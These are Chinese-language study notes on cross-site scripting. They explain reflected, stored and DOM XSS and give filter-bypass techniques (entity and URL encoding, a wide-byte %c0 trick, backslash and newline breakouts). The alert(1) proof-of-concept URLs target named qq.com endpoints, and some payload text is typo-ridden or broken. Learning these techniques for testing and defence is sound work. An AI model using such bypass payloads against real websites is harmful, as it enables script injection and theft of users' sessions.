### 反射性xss
反射型xss又称为非持久型xss，这种攻击方式往往具有一次性

==攻击方式==：攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户，当用户访问该链接时，服务器接受该用户的请求并且处理，然后服务器把带有XSS代码的数据发送给用户的浏览器，浏览器解析这段有xss代码的恶意脚本后，就会触发该脚本(反射型xss更多的就是通过链接来的)


--- 
#### 转义方式

 < 不光可以写为 \u003c，还可以写为 \x3c， > 同样可以写为 \x3e。

js的话可以使用`unicode`转义,如`\u003c`

html转码是html编码，比如:`<img src=1"" onerror="alert(1)">`和`<img src="1" onerror="alert&#x28;1&#x29;">`是等效的

写在url，想转义的话可以用url编码，例如：`&-> %26,#->%23`

js中使用\来转义，把`"`转义，

js中可以使用\连接两条ja语句，例如：
```
var i="fdsafds\
ffdsafd"//这一般搭配换行符使用
```

js中如果编码是gb系列的话可以使用`%c0`来使被转义的字符不被转义比如`"`,转过来的话就是`�`


---
### 绕过方式

在 HTML 属性中，会自动对实体字符进行转义。一个简单的比方。

`<img src="1" onerror="alert(1)">`
和
`<img src="1" onerror="alert&#x28;1&#x29;">`
是等效的,换言之，只要上面的情况，没有过滤 &，# 等符号，我们就可以写入任意字符。

JS 部分我们可以做以下构造,由于'被过滤，我们可以将'写为 `&#x27`;

`location.href='........&searchvalue_yjbg=aaaaaa'`

`location.href='........&searchvalue_yjbg=aaaaaa'+alert(1)+''`

JS 部分我们可以做以下构造,由于'被过滤，我们可以将'写为 `&#x27`;//这个地方用的是html解码，也是unicode
接着我们把代码转换为 url 的编码。 `&-> %26`, `# -> %23`

最后的实现代码如下：
`http://stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&searchvalue_yjbg=aaaaaaa%26%23x27;%2balert(1)%2b%2;`


---
#### 宽字节绕过
 例子如下：
`http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&t=%22;alert(1);//aaaaaa`

我们尝试注入 " 来闭合前面的双引号，但是很悲剧的是，双引号被过滤了。。
如下图：

`var gstest = "&quot:;alert(1);//aaaa";`

然后我们可以看到编码是：
`<meta http-equiv="Content-Type" content="text/html; charset=gb18030" />`

gbxxxxxx系列的编码，那么我们尝试一下宽字节？
`http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&t=%c0%22;alert(1);//aaaaaa`

看看效果：

这个通过了`var gstest = "�";alert(1);//aaaa";`

至于这个漏洞的成因，和传统的宽字节漏洞并不一样。目测应该是由于过滤双引号的正则表达式写的有问题造成的。并不是因为%22变成了`%5c%22`。

---

### 反斜线绕过

有缺陷的部分是：
`location.href="........."+"&ss=aaaa"+"&from=bbb"+"&param=";//后面省略。`

例如执行以下代码

`location.href="........."+"&ss=aaaa"+"&from=bbb"+"&param=";//后面省略。`
可以控制aaa但是又不能用"，这时使用\，杀掉后面的引号。
`location.href="………"+"&ss=aaa\"+"&from=bbb"+"&param=";`

为了保证 bbb 后面的语法正确性，我们把 bbb 改为一个数字，把 bbb 后面加上 // 来注释掉后面的部分。变成以下形式.
`location.href="……"+"&ss=aaa\"+"&from=1//"+"&param="`
运行的话就是("字符串"&from)=1
再改为
`location.href="……"+"&ss=aaa\"+"&from==1//"+"&param="`
这样运行的话就是("字符串")&(from=1)

最后代码为：
`location.href="........."+"&ss=aaaa\"+"&from==1;alert(1);function/**/from(){}//"+"&param=";`
这里的函数作用的作用为定义了`from`这个用户标识符，后面的注释是因为空格被转义,所以用注释占位

---
#### 换行符绕过

如果是在js的注释里面的话，可以试试换行符绕过，比如
嗯，这样一来，是否会想到这样一个用法呢？

//我是注释，我爱洗澡，哦～哦～哦～ [我是输出] alert(1)

如果可以使用换行符的话。

//我是注释，我爱洗澡，哦～哦～哦～ [我是输出 换行符

alert(1);//我是输出]

这样 alert(1); 就会被成功执行。


---
### 存储型XSS
储存型XSS又称为持久型XSS，攻击脚本会永久的刘春在目标服务器的数据库或文件中，具有很高的隐蔽性。
攻击方式：这种攻击方式多见于论坛，博客，和留言板中

### DOM型XSS
简单说就是通过<scrpt></script>这种前端的js代码从而达到修改前端内容的目的(这种解释不是绝对正确的)，DON型XSS也是分为反射型XSS和存储型XSS



XSS平台